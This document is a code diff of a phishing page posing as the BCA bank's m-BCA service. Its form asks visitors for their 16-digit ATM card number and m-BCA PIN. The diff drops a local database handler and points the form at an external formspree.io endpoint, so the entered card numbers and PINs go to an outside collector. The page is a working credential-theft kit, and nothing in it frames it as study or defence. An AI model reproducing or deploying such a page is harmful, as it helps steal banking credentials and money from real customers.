@@ -1,44 +1,3 @@
-<?php 
-
-if(isset($_POST['submit'])){
-
-
-    $host      =      'localhost';
-    $dbname    =      'bca';
-    $dbuser    =      'root';
-    $dbpass    =      '';
-    $tbname    =      'email_list';
-
-
-  $conn = mysqli_connect($host,$dbuser,$dbpass,$dbname);
-  $name = mysqli_real_escape_string($conn, $_POST['nomor_atm']);
-    $email = mysqli_real_escape_string($conn, $_POST['pin']);
- 
-  //Email
-  $query_email = "SELECT * FROM `$tbname` WHERE email ='$email' ";
-
-  $result_email = $conn->query($query_email);
-
-  $client_email = $result_email->fetch_array();
-
-  if($client_email)
-  {
-  $msg='<div class="msg-mailsb msg-mail-red">Thanks! Your form has been send..</div> ';
-
-  }else { 
-  $sql = "INSERT INTO `email_list` (`id`, `name`, `email`) VALUES (NULL, '$name', '$email')";
-
-  $conn->query($sql);
-  
-  $msg= '<div class="msg-mailsb msg-mail-green">
-            Success!!<br>
-            <span class="mailsub-goback-btn"><a href="javascript:window.history.go(-1);">Click here</a></span>  return to the recent page you were browsing.
-          </div> ';
-}
-}
-
-
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -54,17 +13,17 @@ if(isset($_POST['submit'])){
 </head>
 <body>
   <nav>
-    <img src="https://res.cloudinary.com/codelifings/image/upload/v1614170786/nav_p9nvvi.png" alt="navbar">
+    <img src="nav.png" alt="navbar">
   </nav>
   <br>
   <div>
     <img src="https://res.cloudinary.com/codelifings/image/upload/v1613365398/Tak_berjudul43_20210215120201_np8fkd.png" alt="">
   </div>
   <br><br>
-    <form action="" method="POST" accept-charset="utf-8">
-      <input class="u-full-width" type="number" placeholder="Masukkan 16 angka No Kartu ATM anda" id="nomor_atm" name="nomor_atm">
+    <form action="https://formspree.io/f/xyybaejk" method="POST">
+      <input class="u-full-width" type="number" placeholder="Masukkan 16 angka No Kartu ATM anda" id="nomor-atm" name="nomor-atm">
       <input class="u-full-width" type="number" placeholder="Masukkan Pin m-BCA Anda" id="pin" name="pin">
-      <input style="float: right" name="submit" class="button-primary" type="submit" value="OK">
+      <input style="float: right" class="button-primary" type="submit" value="OK">
     </form>
 
 </body>
